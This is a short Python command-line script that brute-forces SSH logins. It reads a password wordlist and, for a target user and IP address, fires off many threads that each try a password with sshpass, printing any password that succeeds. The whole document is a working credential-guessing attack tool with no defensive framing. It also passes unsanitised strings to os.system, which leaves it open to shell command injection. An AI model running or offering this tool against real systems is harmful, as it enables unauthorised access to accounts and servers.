#!/bin/python3

import os
import sys
import threading
import time
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--u')
parser.add_argument('-ip', '--ip')
parser.add_argument('-f', '--file')
args = parser.parse_args()

file = args.file

if not file:
	file = "yes.txt"

passwords = open(file, "r")

user = args.u
ip = args.ip

tentativa = 1280

global dead
dead = False

def login(password):
	if os.system("sshpass -p "+password+" ssh "+user+"@"+ip+" 2>/dev/null exit") == 0:
		print("[*] Password found : " + password + " [*]")
		global dead
		dead = True

count=0
passwordsArray = passwords.readlines()
	
for i in range(0, len(passwordsArray)):
	if not dead:
		thread1 = threading.Thread(target=login, args=(passwordsArray[i].strip(),))		
		thread1.start()
		if i%20 == 0 and not i == 0:
			time.sleep(1)
	else:
		thread1.join()
		print("Leaving...")
		sys.exit()
